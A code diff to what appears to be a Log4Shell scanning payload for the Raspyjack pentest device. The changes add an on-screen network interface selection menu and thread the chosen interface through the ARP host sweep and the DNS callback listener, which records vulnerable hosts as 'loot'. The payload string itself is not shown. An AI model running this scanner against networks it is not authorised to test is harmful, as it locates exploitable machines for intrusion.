@@ -26,7 +26,6 @@ on the target. For educational and authorized testing purposes only.
 # ---------------------------------------------------------------------------
 import os, sys, subprocess, signal, time, threading, socket, requests
 from queue import Queue
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 
 # ---------------------------- Third‑party libs ----------------------------
 try:
@@ -94,7 +93,19 @@ else:
 # ---------------------------------------------------------------------------
 # 3) Global State & Configuration
 # ---------------------------------------------------------------------------
-ETH_INTERFACE = "eth0"
+try:
+    sys.path.append('/root/Raspyjack/wifi/')
+    from wifi.raspyjack_integration import get_available_interfaces
+    from wifi.wifi_manager import WiFiManager
+    WIFI_INTEGRATION = True
+    wifi_manager = WiFiManager()
+    print("✅ WiFi integration loaded - dynamic interface support enabled")
+except ImportError as e:
+    print(f"⚠️  WiFi integration not available: {e}")
+    WIFI_INTEGRATION = False
+    wifi_manager = None # Ensure wifi_manager is None if import fails
+
+ETH_INTERFACE = "eth0" # Default, will be set by user selection
 LOOT_DIR = "/root/Raspyjack/loot/Log4Shell/"
 WEB_PORTS = [80, 8080, 443, 8443] # Will be configurable
 running = True
@@ -231,6 +242,56 @@ def handle_text_input_logic(initial_text, screen_state_name, char_set):
 # ---------------------------------------------------------------------------
 # 6) Core Scanner Logic
 # ---------------------------------------------------------------------------
+def draw_ui_interface_selection(interfaces, current_selection):
+    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    d = ImageDraw.Draw(img)
+    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
+    d.line([(0, 22), (128, 22)], fill="cyan", width=1)
+
+    y_pos = 25
+    for i, iface in enumerate(interfaces):
+        color = "yellow" if i == current_selection else "white"
+        d.text((5, y_pos), iface, font=FONT, fill=color)
+        y_pos += 11
+    
+    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+def select_interface_menu():
+    global ETH_INTERFACE, scan_status
+    
+    if not WIFI_INTEGRATION or not wifi_manager:
+        show_message(["WiFi integration", "not available!"], "red")
+        time.sleep(3)
+        return None # Return None if integration is not available
+
+    available_interfaces = get_available_interfaces() # Get all available interfaces
+    if not available_interfaces:
+        show_message(["No network", "interfaces found!"], "red")
+        time.sleep(3)
+        return None
+
+    current_menu_selection = 0
+    while running:
+        draw_ui_interface_selection(available_interfaces, current_menu_selection)
+        
+        if GPIO.input(PINS["KEY3"]) == 0: # Cancel
+            return None
+        
+        if GPIO.input(PINS["UP"]) == 0:
+            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
+            time.sleep(0.2)
+        elif GPIO.input(PINS["DOWN"]) == 0:
+            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
+            time.sleep(0.2)
+        elif GPIO.input(PINS["OK"]) == 0:
+            selected_iface = available_interfaces[current_menu_selection]
+            show_message([f"Selected:", f"{selected_iface}"], "lime")
+            time.sleep(1)
+            return selected_iface
+        
+        time.sleep(0.1)
+
 def get_local_ip(interface="eth0"):
     """Gets the local IP address of the specified interface."""
     try:
@@ -238,7 +299,7 @@ def get_local_ip(interface="eth0"):
     except Scapy_Exception:
         return None
 
-def dns_listener(local_ip):
+def dns_listener(local_ip, interface):
     """Listens for DNS queries directed at our IP."""
     global scan_status
     
@@ -255,7 +316,7 @@ def dns_listener(local_ip):
                         vulnerable_hosts.append(victim_ip)
                         save_loot()
 
-    sniff(filter=f"udp port 53 and dst host {local_ip}", prn=handle_dns_packet, stop_filter=lambda p: not running)
+    sniff(iface=interface, filter=f"udp port 53 and dst host {local_ip}", prn=handle_dns_packet, stop_filter=lambda p: not running)
 
 def save_loot():
     os.makedirs(LOOT_DIR, exist_ok=True)
@@ -263,30 +324,30 @@ def save_loot():
     with open(loot_file, "w") as f:
         f.writelines([f"{host}\n" for host in vulnerable_hosts])
 
-def run_scan():
+def run_scan(interface):
     global scan_status, vulnerable_hosts
     vulnerable_hosts = [] # Clear previous results
     
-    local_ip = get_local_ip(ETH_INTERFACE)
+    local_ip = get_local_ip(interface)
     if not local_ip:
-        with ui_lock: scan_status = "eth0 has no IP!"
+        with ui_lock: scan_status = f"{interface} has no IP!"
         return
 
     # Start DNS listener in background
-    threading.Thread(target=dns_listener, args=(local_ip,), daemon=True).start()
+    threading.Thread(target=dns_listener, args=(local_ip, interface,), daemon=True).start()
     
     # Discover hosts
     with ui_lock: scan_status = "Discovering hosts..."
     network_range = None
     try:
-        network_range = subprocess.check_output(f"ip -o -4 addr show {ETH_INTERFACE} | awk '{{print $4}}'", shell=True).decode().strip()
+        network_range = subprocess.check_output(f"ip -o -4 addr show {interface} | awk '{{print $4}}'", shell=True).decode().strip()
     except subprocess.CalledProcessError:
         pass # Fallback to local_ip/24 if ip command fails
     
     if not network_range:
         network_range = f"{local_ip}/24" # Fallback to /24 if detection fails
         
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=5, iface=ETH_INTERFACE, verbose=0)
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=5, iface=interface, verbose=0)
     live_hosts = [received.psrc for sent, received in ans]
     
     # The JNDI payload
@@ -325,7 +386,20 @@ try:
     # Disable requests' insecure request warnings
     requests.packages.urllib3.disable_warnings()
 
-    scan_thread = threading.Thread(target=run_scan, daemon=True)
+    selected_interface = None
+    if WIFI_INTEGRATION:
+        selected_interface = select_interface_menu()
+        if not selected_interface:
+            show_message(["No interface", "selected!", "Exiting..."], "red")
+            time.sleep(3)
+            sys.exit(1)
+    else:
+        # Fallback if WIFI_INTEGRATION is not available
+        selected_interface = "eth0" # Default to eth0 if no dynamic selection
+        show_message([f"Using default:", f"{selected_interface}"], "lime")
+        time.sleep(2)
+
+    scan_thread = threading.Thread(target=run_scan, args=(selected_interface,), daemon=True)
     scan_thread.start()
 
     while running:
@@ -338,7 +412,7 @@ try:
             
             if GPIO.input(PINS["OK"]) == 0:
                 # Re-run scan
-                scan_thread = threading.Thread(target=run_scan, daemon=True)
+                scan_thread = threading.Thread(target=run_scan, args=(selected_interface,), daemon=True)
                 scan_thread.start()
                 time.sleep(0.3) # Debounce
             
